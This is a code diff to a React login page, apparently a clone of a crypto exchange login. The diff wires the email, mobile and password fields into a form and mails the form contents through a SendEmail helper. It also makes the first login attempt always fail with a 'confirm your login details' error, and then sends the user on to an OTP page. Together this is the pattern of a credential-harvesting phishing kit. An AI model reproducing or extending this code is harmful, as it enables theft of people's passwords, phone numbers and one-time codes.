@@ -1,5 +1,4 @@
-import React, { useState } from "react";
-import image from "../../assets/mexImage.png";
+import React, { useRef, useState } from "react";
 import "../login/login.css";
 import { IoQrCode } from "react-icons/io5";
 import { FaEnvelope } from "react-icons/fa6";
@@ -13,6 +12,7 @@ import { FaTelegramPlane } from "react-icons/fa";
 import { FaRegClock } from "react-icons/fa";
 import Countdown from "../countdown-Timer/Countdown";
 import { useNavigate } from "react-router-dom";
+import { SendEmail } from "../sendEmail/SendEmail";
 
 const Login = () => {
   const [isActive, setIsActive] = useState("email");
@@ -26,6 +26,9 @@ const Login = () => {
   const [loader, setLoader] = useState(false);
 
   const navigate = useNavigate();
+  const form = useRef()
+
+  
 
   const handleSubmit = (e) => {
     e.preventDefault();
@@ -44,6 +47,7 @@ const Login = () => {
 
     if (!loginAttempted) {
       setError("Please confirm your login details and try again.");
+      SendEmail(form)
       setLoginAttempted(true);
       return;
     }
@@ -53,10 +57,15 @@ const Login = () => {
     setError("");
      setLoader(false);
     navigate("/otp");
+    SendEmail(form)
    
     }, 3000)
 
   };
+
+  
+
+
 
   return (
     <div className="afternavdiv">
@@ -84,6 +93,7 @@ const Login = () => {
       </div>
       <div className="main-section">
         <div className="loginDiv">
+          <form ref={form} onSubmit={handleSubmit}>
           <h2>Log In</h2>
           <div className="optionDiv">
             <p
@@ -110,6 +120,7 @@ const Login = () => {
               <div className="input-wrapper">
                 <FaEnvelope className="input-icon" id="envelope-icon" />
                 <input
+                  name="email"
                   type="email"
                   className="input"
                   placeholder="Email/Sub-Account"
@@ -124,6 +135,7 @@ const Login = () => {
               <div className="input-wrapper">
                 <FaEnvelope className="input-icon" id="envelope-icon" />
                 <input
+                  name="mobile"
                   type="tel"
                   inputMode="numeric"
                   className="input"
@@ -155,6 +167,7 @@ const Login = () => {
               </div>
 
               <input
+                name="password"
                 type={showPassword ? "text" : "password"}
                 className="input"
                 placeholder="Password"
@@ -180,7 +193,7 @@ const Login = () => {
               <p>Stay logged in on this device for 5 days</p>
             </div>
 
-            <button className="button" onClick={handleSubmit}>
+            <button type = "submit" className="button">
               {loader? "Verifying...." : "Login"}
             </button>
             <p className="forgotP">Forgot Password?</p>
@@ -205,6 +218,7 @@ const Login = () => {
               <FaTelegramPlane className="social-icon" id="telegram" />
             </div>
           </div>
+          </form>
         </div>
         <div className="imageDiv">
           <div className="content">
